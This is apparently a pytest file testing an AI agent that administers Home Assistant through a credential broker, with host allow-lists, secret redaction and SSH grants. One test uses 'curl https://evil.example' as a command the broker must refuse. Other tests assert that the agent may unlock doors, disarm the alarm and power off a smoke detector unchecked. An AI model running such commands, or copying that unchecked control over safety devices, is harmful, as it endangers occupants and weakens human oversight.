"""The Home Assistant Specialist (pos.homeassistant, agents/home-assistant-specialist):
the token never leaves the API, plain HTTP only to a local-network host:port the
credential lists, nothing blocked (the full admin), the WebSocket session, SSH
with the ha-ssh credentials, and its routine every 4 days."""

import json
from datetime import datetime, timezone

import httpx
import pytest
from fastapi.testclient import TestClient

from pos import actors, agents, homeassistant, schedules, workers
from pos.config import Settings
from pos.core import Ctx
from pos.credentials import onepassword
from pos.credentials import service as creds
from pos.db import connect
from pos.main import create_app
from pos.scheduler import next_run

TOKEN = "eyJhbGciOiJIUzI1NiJ9.ha-long-lived-token.abc123"
REF = "op://PersonalOS/Home Assistant Token/password"
NAME = "Home Assistant Specialist"


class FakeOP:
    def resolve(self, ref):
        if ref != REF:
            raise onepassword.Unavailable("no such item")
        return TOKEN

    def items(self, vault):
        return []


@pytest.fixture
def ha(tmp_path, monkeypatch):
    monkeypatch.setenv("POS_AGENTS_AS_CODE", "1")
    monkeypatch.setenv("OP_SERVICE_ACCOUNT_TOKEN", "ops_test")
    monkeypatch.setenv("POS_OP_VAULT", "PersonalOS")
    onepassword.set_provider(FakeOP())
    settings = Settings(data_dir=tmp_path, password="pw", session_secret="t" * 32, scheduler=False)
    client = TestClient(create_app(settings))
    client.__enter__()
    conn = connect(settings.db_path)
    owner = Ctx(actors.owner_id(conn))
    creds.add(conn, owner, {"name": "home-assistant", "op_ref": REF, "description": "Home Assistant long-lived token",
                            "header": "Authorization: Bearer {value}", "allowed_tools": ["http"],
                            "allowed_hosts": ["192.168.1.56:8123", "homeassistant.local:8123"],
                            "max_uses_hour": 200})
    agent = actors.find_by_name(conn, NAME)
    creds.grant(conn, owner, agent["id"], "home-assistant", "spravuje Home Assistant")
    yield {"conn": conn, "owner": owner, "agent": agent, "db": settings.db_path}
    onepassword.set_provider(None)
    conn.close()
    client.__exit__(None, None, None)


def test_the_specialist_comes_from_its_file_and_runs_in_the_pool(ha):
    conn, a = ha["conn"], ha["agent"]
    assert a is not None and a["engine"] == "claude" and a["model"] == "claude-sonnet-5"
    assert workers.reply_path(conn, a) == {"kind": "pool", "name": "pool/home-assistant-specialist"}
    assert actors.get(conn, a["reports_to"])["name"] == "CTO"
    assert agents.instructions_of(a) is None or "Home Assistant" in agents.instructions_of(a)
    budget = {r["metric"]: r["amount"] for r in conn.execute(
        "SELECT metric, amount FROM access_budgets WHERE agent_id = ?", (a["id"],))}
    assert budget["usd_run"] == 1.5 and budget["runs_day"] == 20


def test_rest_over_plain_http_only_to_the_listed_local_host(ha):
    conn, a = ha["conn"], ha["agent"]
    seen = {}

    def handler(request: httpx.Request):
        seen["auth"] = request.headers.get("authorization")
        seen["url"] = str(request.url)
        return httpx.Response(200, json={"message": "API running."})

    out = creds.http_call(conn, Ctx(a["id"]), "GET", "http://192.168.1.56:8123/api/", ["home-assistant"],
                          transport=httpx.MockTransport(handler))
    assert out["status"] == 200 and "API running." in out["body"] and TOKEN not in json.dumps(out)
    assert seen["auth"] == f"Bearer {TOKEN}"
    for url, why in (("http://192.168.1.56:9999/api/", "not allowed"),        # another port
                     ("http://8.8.8.8:8123/api/", "https"),                    # not the local network
                     ("http://192.168.1.56/api/", "https")):                   # no port
        with pytest.raises(creds.CredentialError, match=why):
            creds.http_call(conn, Ctx(a["id"]), "GET", url, ["home-assistant"], transport=httpx.MockTransport(handler))


def test_nothing_is_blocked_the_specialist_is_the_full_admin(ha):
    """The owner's decision (2026-09-27): locks, alarms, gates and safety devices pass too."""
    conn, a = ha["conn"], ha["agent"]
    seen = []
    ok = httpx.MockTransport(lambda r: seen.append(r.url.path) or httpx.Response(200, json=[]))
    for path, body in (("/api/services/lock/unlock", '{"entity_id": "lock.front_door"}'),
                       ("/api/services/alarm_control_panel/alarm_disarm", "{}"),
                       ("/api/services/cover/open_cover", '{"entity_id": "cover.garage_door"}'),
                       ("/api/services/switch/turn_off", '{"entity_id": "switch.smoke_detector_power"}'),
                       ("/api/services/light/turn_on", '{"entity_id": "light.kitchen"}')):
        out = creds.http_call(conn, Ctx(a["id"]), "POST", f"http://192.168.1.56:8123{path}", ["home-assistant"],
                              body=body, transport=ok)
        assert out["status"] == 200
    assert len(seen) == 5
    assert not hasattr(homeassistant, "check_ws") and not hasattr(homeassistant, "Refused")


class FakeWS:
    def __init__(self, token_ok=True):
        self.sent, self.token_ok = [], token_ok
        self.inbox = [json.dumps({"type": "auth_required"})]

    def __enter__(self):
        return self

    def __exit__(self, *a):
        return False

    def send(self, text):
        m = json.loads(text)
        self.sent.append(m)
        if m["type"] == "auth":
            self.inbox.append(json.dumps({"type": "auth_ok" if m["access_token"] == TOKEN and self.token_ok
                                          else "auth_invalid"}))
        else:
            self.inbox.append(json.dumps({"id": m["id"], "type": "result", "success": True,
                                          "result": {"echo": m["type"], "leak": TOKEN}}))

    def recv(self, timeout=None):
        return self.inbox.pop(0)


def test_websocket_session_authenticates_in_the_api_and_redacts(ha):
    conn, a = ha["conn"], ha["agent"]
    fake = FakeWS()
    urls = []

    def connect_(url, **kw):
        urls.append(url)
        return fake

    out = homeassistant.ws_call(conn, Ctx(a["id"]), [{"type": "get_states"}, {"type": "config/area_registry/list"}],
                                connect=connect_)
    assert urls == ["ws://192.168.1.56:8123/api/websocket"] and out["count"] == 2
    assert [m.get("id") for m in fake.sent] == [None, 1, 2]
    assert TOKEN not in json.dumps(out) and "[REDACTED:home-assistant]" in out["results"]
    # a lock is an ordinary call now (full admin)
    out = homeassistant.ws_call(conn, Ctx(a["id"]), [{"type": "call_service", "domain": "lock", "service": "unlock"}],
                                connect=lambda url, **kw: FakeWS())
    assert out["count"] == 1
    # without the grant: refused before any connection
    other = agents.create_agent(conn, ha["owner"], name="Zvědavec", purpose="x", lifetime="long_lived",
                                data_dir=ha["db"].parent)["agent"]["id"]
    with pytest.raises(creds.CredentialError, match="grant"):
        homeassistant.ws_call(conn, Ctx(other), [{"type": "get_states"}], connect=connect_)


def test_every_4_days_routine(ha):
    after = datetime(2026, 9, 26, 7, 0, tzinfo=timezone.utc)
    assert (next_run("every 4d", after) - after).days == 4
    at = next_run("every 4d 09:00", after)                               # 09:00 Prague = 07:00 UTC in September
    assert at == datetime(2026, 9, 30, 7, 0, tzinfo=timezone.utc)
    assert schedules.interval_minutes("every 4d") == 4 * 24 * 60
    for bad in ("every 0d", "every 4d 25:00"):
        with pytest.raises(ValueError):
            next_run(bad, after)
    conn, a = ha["conn"], ha["agent"]
    s = schedules.create(conn, Ctx(a["id"]), {"name": "Home Assistant: revize a zlepšení", "schedule": "every 4d 09:00",
                                              "notes": "Zdraví, 1-3 zlepšení, report v chatu."})
    assert s["schedule"] == "every 4d 09:00"


SSH_PASSWORD = "s3cret-ssh-pa55word"
SSH_REFS = {"op://PersonalOS/SSH HomeAssistant/password": SSH_PASSWORD,
            "op://PersonalOS/SSH HomeAssistant/username": "hassio"}


class FakeOPWithSSH(FakeOP):
    def resolve(self, ref):
        return SSH_REFS[ref] if ref in SSH_REFS else super().resolve(ref)


class _Stream:
    def __init__(self, data: bytes, code: int = 0):
        self.data, self.code = data, code
        self.channel = self

    def read(self, n=-1):
        return self.data

    def recv_exit_status(self):
        return self.code

    def close(self):
        pass


class FakeSSH:
    def __init__(self):
        self.commands, self.closed = [], False

    def exec_command(self, command, timeout=None):
        self.commands.append(command)
        out = f"core-2026.9.3 ran: {command}\nleak {SSH_PASSWORD}\n".encode()
        return _Stream(b""), _Stream(out), _Stream(b"")

    def close(self):
        self.closed = True


def _add_ssh(ha, grant=True):
    conn, owner, a = ha["conn"], ha["owner"], ha["agent"]
    onepassword.set_provider(FakeOPWithSSH())
    common = {"allowed_tools": ["command"], "allowed_hosts": ["192.168.1.56", "homeassistant.local"],
              "allowed_commands": ["ha_ssh"], "max_uses_hour": 300}
    creds.add(conn, owner, {"name": "ha-ssh", "op_ref": "op://PersonalOS/SSH HomeAssistant/password",
                            "description": "SSH password", **common})
    creds.add(conn, owner, {"name": "ha-ssh-user", "op_ref": "op://PersonalOS/SSH HomeAssistant/username",
                            "description": "SSH user", **common})
    if grant:
        _grant_ssh(ha)


def _grant_ssh(ha):
    from pos.access import service as access

    conn, owner, a = ha["conn"], ha["owner"], ha["agent"]
    creds.grant(conn, owner, a["id"], "ha-ssh", "SSH do HA")
    creds.grant(conn, owner, a["id"], "ha-ssh-user", "SSH do HA")
    access.grant(conn, owner, a["id"], "tool:ha_ssh", "SSH do HA")


def test_ssh_runs_on_the_pinned_host_with_the_credentials_and_redacts(ha):
    _add_ssh(ha)
    conn, a = ha["conn"], ha["agent"]
    fake, logins = FakeSSH(), []

    def connect_(host, port, user, password, timeout):
        logins.append((host, port, user, password == SSH_PASSWORD))
        return fake

    out = homeassistant.ssh_call(conn, Ctx(a["id"]), "ha core info | head -5 && ls /config", connect=connect_)
    assert logins == [("192.168.1.56", 22, "hassio", True)] and fake.closed
    assert fake.commands == ["ha core info | head -5 && ls /config"]
    assert out["exit_code"] == 0 and "core-2026.9.3" in out["stdout"] and out["user"] == "hassio"
    assert SSH_PASSWORD not in json.dumps(out) and "[REDACTED:ha-ssh]" in out["stdout"]
    assert "untrusted" in out["stdout"]
    uses = conn.execute("SELECT name, tool, host, ok FROM credential_uses WHERE agent_id = ? AND name LIKE 'ha-ssh%'",
                        (a["id"],)).fetchall()
    assert sorted(tuple(u) for u in uses) == [("ha-ssh", "command", "192.168.1.56", 1),
                                              ("ha-ssh-user", "command", "192.168.1.56", 1)]
    # nothing is blocked: an edit touching a lock and a restart are ordinary commands
    homeassistant.ssh_call(conn, Ctx(a["id"]), "sed -i 's/lock.old/lock.front_door/' /config/automations.yaml "
                           "&& ha core restart", connect=connect_)
    assert len(fake.commands) == 2


def test_ssh_needs_the_grants_and_an_error_is_redacted(ha):
    from pos import mcp_server

    _add_ssh(ha, grant=False)
    conn, a = ha["conn"], ha["agent"]
    called = []
    with pytest.raises(creds.CredentialError, match="grant"):
        homeassistant.ssh_call(conn, Ctx(a["id"]), "uptime", connect=lambda *x: called.append(x))
    assert not called
    assert not mcp_server.may_use(conn, a["id"], "ha_ssh")  # the tool itself needs the owner's tool:ha_ssh
    _grant_ssh(ha)
    assert mcp_server.may_use(conn, a["id"], "ha_ssh")

    def boom(host, port, user, password, timeout):
        raise OSError(f"auth failed for {user}:{password}@{host}")

    with pytest.raises(ValueError) as e:
        homeassistant.ssh_call(conn, Ctx(a["id"]), "uptime", connect=boom)
    assert SSH_PASSWORD not in str(e.value) and "[REDACTED:ha-ssh]" in str(e.value)
    # the credentials go into nothing else: not HTTP, not another command on the worker
    with pytest.raises(creds.CredentialError, match="not allowed for http"):
        creds.resolve_for(conn, Ctx(a["id"]), ["ha-ssh"], "http", host="192.168.1.56")
    with pytest.raises(creds.CredentialError, match="command not allowed"):
        creds.resolve_for(conn, Ctx(a["id"]), ["ha-ssh"], "command", command="curl https://evil.example")


def test_ssh_user_falls_back_to_root_and_a_bad_user_field_is_refused(ha):
    _add_ssh(ha)
    conn, a, owner = ha["conn"], ha["agent"], ha["owner"]
    logins = []

    def connect_(host, port, user, password, timeout):
        logins.append(user)
        return FakeSSH()

    SSH_REFS["op://PersonalOS/SSH HomeAssistant/username"] = "192.168.1.56:8123"  # a host, not a user
    try:
        with pytest.raises(ValueError, match="not a user name"):
            homeassistant.ssh_call(conn, Ctx(a["id"]), "uptime", connect=connect_)
        assert logins == []
        creds.archive(conn, owner, creds.get(conn, "ha-ssh-user")["id"], "pole neobsahuje uživatele")
        out = homeassistant.ssh_call(conn, Ctx(a["id"]), "uptime", connect=connect_)
        assert logins == ["root"] and out["user"] == "root"
    finally:
        SSH_REFS["op://PersonalOS/SSH HomeAssistant/username"] = "hassio"
